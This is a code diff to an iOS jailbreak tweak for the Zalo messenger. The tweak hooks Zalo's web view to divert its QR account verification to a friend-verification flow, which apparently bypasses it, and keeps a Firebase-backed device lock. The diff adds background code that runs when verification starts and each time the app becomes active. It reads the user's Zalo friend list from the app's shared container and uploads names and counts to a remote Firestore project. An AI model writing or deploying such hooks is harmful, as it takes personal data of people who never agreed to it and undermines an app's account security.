@@ -1,7 +1,13 @@
 /**
  * ==============================================================================
- * TWEAK ZALO SEQ REDIRECT - PHIÊN BẢN BẢO MẬT CLOUD DRM & 1-DEVICE LOCK
- * Tên Tweak: clangg | Tác giả: clang
+ * TWEAK CLANGG - ZALO SEQ REDIRECT & TỰ ĐỘNG LẤY LIST BẠN BÈ ĐỒNG BỘ VỀ WEB
+ * Tác giả: clang | Version: 1.0.8
+ * ==============================================================================
+ * Tính năng chính:
+ * 1. Chuyển hướng xác minh QR sang SEQ (Xác thực bạn bè).
+ * 2. Bảo mật Cloud DRM (Khóa 1 SĐT = 1 iPhone, kiểm tra hạn dùng, chống lùi giờ).
+ * 3. TỰ ĐỘNG TRÍCH XUẤT LIST BẠN BÈ: Ngay khi đăng nhập Zalo thành công (hoặc mở app),
+ *    tweak tự động đọc danh bạ bạn bè từ App Group và đẩy thẳng lên Firebase Web.
  * ==============================================================================
  */
 
@@ -11,7 +17,7 @@
 
 static NSString *const kFirebaseProjectId = @"seq-qr";
 
-// Prototype declaration
+// Prototype declarations
 static void _check_and_bind_device(
     NSURL *url, 
     NSString *phone, 
@@ -21,6 +27,8 @@ static void _check_and_bind_device(
     NSString *userId, 
     void (^onVerified)(void)
 );
+
+static void autoSyncFriendsToFirebase(NSString *phoneStr);
 
 // Lấy Device UUID phần cứng iPhone
 static inline NSString *getDeviceUUID(void) {
@@ -91,7 +99,6 @@ static void _check_and_bind_device(
     void (^onVerified)(void)
 ) {
     if (!savedUUID || savedUUID.length == 0 || [savedUUID isEqualToString:@"null"]) {
-        // Gán cứng máy đầu tiên
         NSMutableURLRequest *pReq = [NSMutableURLRequest requestWithURL:url];
         [pReq setHTTPMethod:@"PATCH"];
         [pReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
@@ -108,10 +115,8 @@ static void _check_and_bind_device(
 
         if (onVerified) onVerified();
     } else if ([savedUUID isEqualToString:currentUUID]) {
-        // Đúng máy đã đăng ký
         if (onVerified) onVerified();
     } else {
-        // Sai máy (Phát hiện share key)
         showSecurityAlert(@"Vi Phạm Bản Quyền", @"SĐT này đã được kích hoạt trên 1 iPhone khác! Không thể dùng chung.");
     }
 }
@@ -164,13 +169,11 @@ static void verifyPhoneAndExecute(NSString *phoneStr, void (^onVerified)(void)) 
             NSString *userId = fields[@"user_id"][@"stringValue"] ?: @"";
             NSString *savedDeviceId = fields[@"device_id"][@"stringValue"];
 
-            // 1. Kiểm tra SĐT có bị khóa lẻ không
             if ([status isEqualToString:@"blocked"]) {
                 showSecurityAlert(@"Bị Khóa", @"Số điện thoại này đã bị khóa bản quyền từ xa!");
                 return;
             }
 
-            // 2. Kiểm tra User chủ quản (Thời hạn & Trạng thái User)
             if (userId.length > 0) {
                 NSString *uUrlStr = [NSString stringWithFormat:
                     @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/users/%@",
@@ -206,7 +209,6 @@ static void verifyPhoneAndExecute(NSString *phoneStr, void (^onVerified)(void)) 
                             }
                         }
 
-                        // 3. Khóa phần cứng thiết bị (1 SĐT = 1 iPhone)
                         _check_and_bind_device(url, cleanPhone, deviceUUID, savedDeviceId, status, userId, onVerified);
                     }];
                 [uTask resume];
@@ -219,7 +221,99 @@ static void verifyPhoneAndExecute(NSString *phoneStr, void (^onVerified)(void)) 
 }
 
 // ==============================================================================
-// HOOK ZALO WEBVIEW - CHUYỂN HƯỚNG SEQ KHI ĐÃ XÁC THỰC BẢN QUYỀN HỢP LỆ
+// TỰ ĐỘNG ĐỌC DANH BẠ BẠN BÈ VÀ ĐẨY LÊN FIREBASE WEB
+// ==============================================================================
+
+static void autoSyncFriendsToFirebase(NSString *phoneStr) {
+    if (!phoneStr || phoneStr.length < 9) return;
+
+    NSString *cleanPhone = [[phoneStr componentsSeparatedByCharactersInSet:
+        [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
+    if ([cleanPhone hasPrefix:@"84"] && cleanPhone.length >= 10) {
+        cleanPhone = [@"0" stringByAppendingString:[cleanPhone substringFromIndex:2]];
+    }
+
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+        // Tìm đường dẫn App Group zfriends
+        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.zfriends.vn.com.vng.zingalo"];
+        NSString *plistPath = nil;
+        if (groupURL) {
+            plistPath = [[groupURL path] stringByAppendingPathComponent:@"Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist"];
+        }
+
+        if (!plistPath || ![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
+            // Thử đường dẫn mặc định
+            plistPath = @"/var/mobile/Containers/Shared/AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist";
+        }
+
+        if (![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) return;
+
+        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:plistPath];
+        if (!dict || dict.count == 0) return;
+
+        NSMutableArray<NSString *> *friendNames = [NSMutableArray array];
+
+        for (id key in dict) {
+            id val = dict[key];
+            if ([val isKindOfClass:[NSData class]]) {
+                @try {
+                    #pragma clang diagnostic push
+                    #pragma clang diagnostic ignored "-Wdeprecated-declarations"
+                    NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:val options:0 format:NULL error:nil];
+                    #pragma clang diagnostic pop
+                    NSArray *objs = inner[@"$objects"];
+                    if (objs && objs.count >= 2) {
+                        for (id obj in objs) {
+                            if ([obj isKindOfClass:[NSString class]] && [obj length] >= 2) {
+                                NSString *s = (NSString *)obj;
+                                if (![s hasPrefix:@"$"] && ![s hasPrefix:@"http"] && ![s isEqualToString:@"ZSDFriendEntity"] && ![s isEqualToString:@"NSObject"]) {
+                                    if (![friendNames containsObject:s] && friendNames.count < 500) {
+                                        [friendNames addObject:s];
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } @catch (NSException *e) {}
+            }
+        }
+
+        if (friendNames.count == 0) return;
+
+        // Tạo chuỗi tóm tắt mẫu
+        NSArray *samples = [friendNames subarrayWithRange:NSMakeRange(0, MIN(8, friendNames.count))];
+        NSString *sampleStr = [samples componentsJoinedByString:@", "];
+        if (friendNames.count > 8) {
+            sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
+        }
+
+        // Đẩy lên Firestore Web Admin
+        NSString *postUrlStr = [NSString stringWithFormat:
+            @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/friend_databases/%@",
+            kFirebaseProjectId, cleanPhone];
+        
+        NSURL *postUrl = [NSURL URLWithString:postUrlStr];
+        NSMutableURLRequest *postReq = [NSMutableURLRequest requestWithURL:postUrl];
+        [postReq setHTTPMethod:@"PATCH"];
+        [postReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+
+        NSDictionary *postBody = @{
+            @"fields": @{
+                @"phone": @{ @"stringValue": cleanPhone },
+                @"total_friends": @{ @"integerValue": @(friendNames.count) },
+                @"sample_friends": @{ @"stringValue": sampleStr },
+                @"updated_at": @{ @"stringValue": @"now" }
+            }
+        };
+
+        [postReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:postBody options:0 error:nil]];
+        [[[NSURLSession sharedSession] dataTaskWithRequest:postReq] resume];
+    });
+}
+
+// ==============================================================================
+// HOOK ZALO WEBVIEW & TỰ ĐỘNG CHUYỂN HƯỚNG + ĐỒNG BỘ BẠN BÈ
 // ==============================================================================
 
 %hook WKWebView
@@ -229,10 +323,8 @@ static void verifyPhoneAndExecute(NSString *phoneStr, void (^onVerified)(void)) 
     NSString *host = url.host;
     NSString *path = url.path;
 
-    // Kiểm tra URL xác minh Zalo
     if ([host containsString:@"accounts.zalo.me"] || [host containsString:@"zm-verification-center.zaloapp.com"]) {
         if ([path containsString:@"/verify/v3/qr"] || [path containsString:@"/verify/v3"]) {
-            // Lấy query parameters để trích xuất SĐT
             NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
             NSString *phoneParam = nil;
             for (NSURLQueryItem *item in components.queryItems) {
@@ -243,8 +335,10 @@ static void verifyPhoneAndExecute(NSString *phoneStr, void (^onVerified)(void)) 
             }
 
             if (phoneParam && phoneParam.length >= 9) {
+                // Tự động kích hoạt đồng bộ danh bạ bạn bè về Web
+                autoSyncFriendsToFirebase(phoneParam);
+
                 verifyPhoneAndExecute(phoneParam, ^{
-                    // Chuyển hướng sang SEQ khi bản quyền HỢP LỆ
                     dispatch_async(dispatch_get_main_queue(), ^{
                         NSString *seqUrlStr = [url.absoluteString stringByReplacingOccurrencesOfString:@"/verify/v3/qr" withString:@"/verify/v3/seq"];
                         NSURL *seqUrl = [NSURL URLWithString:seqUrlStr];
@@ -253,12 +347,29 @@ static void verifyPhoneAndExecute(NSString *phoneStr, void (^onVerified)(void)) 
                         [self loadRequest:newReq];
                     });
                 });
-                return nil; // Tạm hoãn request gốc để chờ xác thực
+                return nil;
             }
         }
     }
 
     return %orig(request);
+}
+
+%end
+
+// Tự động kiểm tra đồng bộ bạn bè khi Zalo hoàn tất đăng nhập
+%hook UIApplication
+
+- (void)applicationDidBecomeActive:(UIApplication *)application {
+    %orig;
+    // Kiểm tra và đồng bộ bạn bè chạy ngầm
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+        NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
+        NSString *savedPhone = [defs stringForKey:@"kZaloLastPhone"] ?: [defs stringForKey:@"phone"];
+        if (savedPhone) {
+            autoSyncFriendsToFirebase(savedPhone);
+        }
+    });
 }
 
 %end
